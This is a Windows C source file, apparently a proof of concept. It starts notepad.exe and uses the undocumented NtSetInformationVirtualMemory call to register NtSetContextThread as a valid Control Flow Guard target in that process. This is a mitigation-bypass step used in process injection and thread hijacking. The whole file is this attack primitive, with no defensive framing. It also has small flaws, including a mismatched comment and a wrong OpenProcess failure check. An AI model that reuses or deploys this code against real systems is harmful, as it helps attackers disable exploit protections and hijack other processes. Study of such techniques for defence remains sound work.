#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>

typedef enum _VIRTUAL_MEMORY_INFORMATION_CLASS
{
	VmPrefetchInformation,
	VmPagePriorityInformation,
	VmCfgCallTargetInformation
} VIRTUAL_MEMORY_INFORMATION_CLASS;

typedef struct _MEMORY_RANGE_ENTRY
{
	PVOID	VirtualAddress;
	SIZE_T	NumberOfBytes;
} MEMORY_RANGE_ENTRY, * PMEMORY_RANGE_ENTRY;

typedef struct _VM_INFORMATION
{
	DWORD					dwNumberOfOffsets;
	PVOID					dwMustBeZero;
	PDWORD					pdwOutput;
	PCFG_CALL_TARGET_INFO	ptOffsets;
} VM_INFORMATION, * PVM_INFORMATION;

typedef NTSTATUS(NTAPI* NTSETINFORMATIONVIRTUALMEMORY)(
	HANDLE								hProcess,
	VIRTUAL_MEMORY_INFORMATION_CLASS	VmInformationClass,
	ULONG_PTR							NumberOfEntries,
	PMEMORY_RANGE_ENTRY					VirtualAddresses,
	PVOID								VmInformation,
	ULONG								VmInformationLength
	);

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

BOOL GetMemoryAllocationBaseAndRegionSize(PVOID pvAddress, PVOID* ppvAllocationBase, PSIZE_T pstRegionSize) {
	SIZE_T						stErr = 0;
	MEMORY_BASIC_INFORMATION	tMemoryBasicInformation = { 0 };

	stErr = VirtualQuery(pvAddress, &tMemoryBasicInformation, sizeof(tMemoryBasicInformation));
	if (0 == stErr) {
		return FALSE;
	}

	*ppvAllocationBase = tMemoryBasicInformation.AllocationBase;
	*pstRegionSize = tMemoryBasicInformation.RegionSize;

	return TRUE;
}

NTSTATUS AddCfgExceptionUndocumentedApi(HANDLE hProcess, PVOID pvAddress) {
	DWORD							dwOutput = 0;
	NTSTATUS						ntStatus = ERROR_SUCCESS;
	SIZE_T							stRegionSize = 0;
	VM_INFORMATION					tVmInformation = { 0 };
	PVOID							pvAllocationBase = NULL;
	MEMORY_RANGE_ENTRY				tVirtualAddresses = { 0 };
	CFG_CALL_TARGET_INFO			tCfgCallTargetInfo = { 0 };
	
	// Function pointers
	NTSETINFORMATIONVIRTUALMEMORY	pNtSetInformationVirtualMemory = NULL;

	// Get the address of ntdll!NtSetInformationVirtualMemory
	CONST HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
	if (hNtdll) {
		pNtSetInformationVirtualMemory = (NTSETINFORMATIONVIRTUALMEMORY)GetProcAddress(hNtdll, "NtSetInformationVirtualMemory");
		if (hNtdll) {
			FreeLibrary(hNtdll);
		}
	}
	else {
		return ERROR_MOD_NOT_FOUND;
	}

	// Get memory allocation base and region size by calling VirtualProtect.
	if (GetMemoryAllocationBaseAndRegionSize(pvAddress, &pvAllocationBase, &stRegionSize) == FALSE) {
		return ERROR_UNHANDLED_ERROR;
	}

	tCfgCallTargetInfo.Flags = CFG_CALL_TARGET_VALID;
	tCfgCallTargetInfo.Offset = (ULONG_PTR)pvAddress - (ULONG_PTR)pvAllocationBase;

	tVirtualAddresses.NumberOfBytes = stRegionSize;
	tVirtualAddresses.VirtualAddress = pvAllocationBase;
	tVmInformation.dwNumberOfOffsets = 0x1;
	tVmInformation.dwMustBeZero = 0x0;
	tVmInformation.pdwOutput = &dwOutput;
	tVmInformation.ptOffsets = &tCfgCallTargetInfo;

	printf("[*] Adding a CFG exception for 0x%X using NtSetInformationVirtualMemory.\n\n\n", pvAddress);
	ntStatus = pNtSetInformationVirtualMemory(
		hProcess,
		VmCfgCallTargetInformation,
		1,
		&tVirtualAddresses,
		&tVmInformation,
		0x10
	);
	if (!NT_SUCCESS(ntStatus)) {
		return ntStatus;
	}

	printf("[*] Exception added successfully.\n\n\n");

	return ntStatus;
}

INT main() {
	HANDLE					hProcess;
	PVOID					pvAddressToAddCfgExceptionTo = NULL;
	NTSTATUS				ntStatus = ERROR_SUCCESS;
	STARTUPINFOA			startupInfo;
	PROCESS_INFORMATION		processInformation;
	DWORD					dwPid;

	//
	// Get address of NtSetContextThread
	//
	CONST HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
	if (hNtdll) {
		pvAddressToAddCfgExceptionTo = GetProcAddress(hNtdll, "NtSetContextThread");
		if (hNtdll) {
			FreeLibrary(hNtdll);
		}
	}
	else {
		return ERROR_MOD_NOT_FOUND;
	}

	//
	// Create host process
	//
	ZeroMemory(&startupInfo, sizeof startupInfo);
	startupInfo.cb = sizeof startupInfo;
	ZeroMemory(&processInformation, sizeof processInformation);

	if (!CreateProcessA(NULL, "\"notepad.exe\"", NULL, NULL, FALSE,
		DETACHED_PROCESS, NULL, NULL, &startupInfo, &processInformation)) {
		return ERROR_CREATE_FAILED;
	}

	dwPid = processInformation.dwProcessId;
	if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid)) == INVALID_HANDLE_VALUE) {
		ntStatus = ERROR_OPEN_FAILED;
		goto lblCleanup;
	}

	//
	// Add cfg exception
	//
	ntStatus = AddCfgExceptionUndocumentedApi(hProcess, pvAddressToAddCfgExceptionTo);

lblCleanup:
	if (processInformation.hProcess) {
		CloseHandle(processInformation.hProcess);
	}

	if (processInformation.hThread) {
		CloseHandle(processInformation.hThread);
	}

	return ntStatus;
}
